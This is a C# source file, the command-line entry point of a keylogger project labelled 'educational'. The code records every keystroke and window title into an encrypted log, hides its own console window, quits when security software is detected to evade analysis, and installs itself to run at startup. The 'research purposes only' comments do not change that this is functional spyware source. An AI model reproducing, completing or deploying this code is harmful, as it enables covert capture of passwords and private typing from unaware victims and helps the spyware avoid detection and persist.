using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using Keylogger.Core.InputMonitoring;
using Keylogger.Core.WindowTracking;
using Keylogger.Core.Encryption;
using Keylogger.AntiDetection.ProcessMonitoring;
using Keylogger.Persistence.Startup;

namespace Keylogger.CLI
{
    /// <summary>
    /// Command line interface for the keylogger educational project
    /// For research and educational purposes only
    /// </summary>
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static readonly string DefaultLogPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            "keylog.txt");
            
        private static readonly string DefaultEncryptionKey = "educational-security-research-key-123";
        
        private static string _logPath;
        private static EncryptionService _encryptionService;
        private static KeyboardMonitor _keyboardMonitor;
        private static ActiveWindowTracker _windowTracker;
        private static SecurityToolDetector _securityToolDetector;
        private static StartupInstaller _startupInstaller;
        
        static void Main(string[] args)
        {
            // Initialize components
            _logPath = DefaultLogPath;
            _encryptionService = new EncryptionService(DefaultEncryptionKey);
            _keyboardMonitor = new KeyboardMonitor();
            _windowTracker = new ActiveWindowTracker(100); // Check every 100ms
            _securityToolDetector = new SecurityToolDetector();
            _startupInstaller = new StartupInstaller("KeyloggerResearch", "Keylogger Research Tool");
            
            // Check command line arguments
            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "-decrypt":
                        ReadDecryptedLog();
                        return;
                    case "-install":
                        InstallPersistence();
                        return;
                    case "-uninstall":
                        RemovePersistence();
                        return;
                    case "-help":
                    case "--help":
                    case "/?":
                        ShowHelp();
                        return;
                }
            }

            // Hide console window for educational demonstration
            HideConsoleWindow();

            Console.WriteLine("Keylogger started for educational purposes.");
            Console.WriteLine($"Logging to: {_logPath}");

            // Add runtime detection evasion
            if (_securityToolDetector.DetectSecurityTools())
            {
                Console.WriteLine("Security software detected. Exiting for educational purposes.");
                Environment.Exit(0);
            }

            // Create log file and add header
            using (StreamWriter sw = File.AppendText(_logPath))
            {
                sw.WriteLine(_encryptionService.Encrypt($"=== Keylogger Started: {DateTime.Now} ==="));
            }

            // Wire up event handlers
            _keyboardMonitor.KeyPressed += KeyboardMonitor_KeyPressed;
            _windowTracker.WindowChanged += WindowTracker_WindowChanged;

            // Start monitoring
            _windowTracker.Start();
            _keyboardMonitor.Start();

            // Keep the application running
            Console.WriteLine("Press ESC to stop monitoring");
            while (true)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Escape)
                    {
                        break;
                    }
                }
                
                Thread.Sleep(100);
            }

            // Clean up and exit
            _keyboardMonitor.Stop();
            _windowTracker.Stop();
            
            Console.WriteLine("Keylogger stopped");
        }

        private static void KeyboardMonitor_KeyPressed(object sender, KeyPressEventArgs e)
        {
            LogKeypress(e.KeyText);
        }

        private static void WindowTracker_WindowChanged(object sender, WindowChangedEventArgs e)
        {
            LogKeypress($"\r\n[Window: {e.NewWindowTitle} - {e.Timestamp}]\r\n");
        }

        private static void LogKeypress(string key)
        {
            try
            {
                // Write to file
                using (StreamWriter sw = File.AppendText(_logPath))
                {
                    sw.Write(_encryptionService.Encrypt(key));
                }

                // For research/debug, you might want to see the output
                Console.Write(key);
            }
            catch
            {
                // Fail silently for demonstration purposes
            }
        }

        static void HideConsoleWindow()
        {
            // For educational purposes - in real research you'd keep this visible
            var handle = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(handle, 0); // 0 = SW_HIDE
        }

        static void ReadDecryptedLog()
        {
            try
            {
                if (!File.Exists(_logPath))
                {
                    Console.WriteLine("Log file not found.");
                    return;
                }
                
                string[] lines = File.ReadAllLines(_logPath);
                Console.WriteLine("=== Decrypted Log Contents ===");
                foreach (string line in lines)
                {
                    try
                    {
                        Console.WriteLine(_encryptionService.Decrypt(line));
                    }
                    catch
                    {
                        Console.WriteLine("[Could not decrypt line]");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading log: {ex.Message}");
            }
        }

        static void InstallPersistence()
        {
            if (_startupInstaller.InstallForPersistence())
            {
                Console.WriteLine("Persistence installed successfully for educational purposes");
            }
            else
            {
                Console.WriteLine("Failed to install persistence");
            }
        }

        static void RemovePersistence()
        {
            if (_startupInstaller.RemovePersistence())
            {
                Console.WriteLine("Persistence removed successfully");
            }
            else
            {
                Console.WriteLine("Failed to remove persistence or persistence not found");
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine("Keylogger Research Tool");
            Console.WriteLine("For educational and security research purposes only");
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("  KeyloggerLabs.exe             - Start keylogging");
            Console.WriteLine("  KeyloggerLabs.exe -decrypt    - Read and decrypt log file");
            Console.WriteLine("  KeyloggerLabs.exe -install    - Install persistence mechanism");
            Console.WriteLine("  KeyloggerLabs.exe -uninstall  - Remove persistence mechanism");
            Console.WriteLine("  KeyloggerLabs.exe -help       - Show this help message");
            Console.WriteLine();
            Console.WriteLine("Educational value:");
            Console.WriteLine("  This tool demonstrates keylogging techniques for");
            Console.WriteLine("  understanding how malware operates and how to defend against it");
        }
    }
}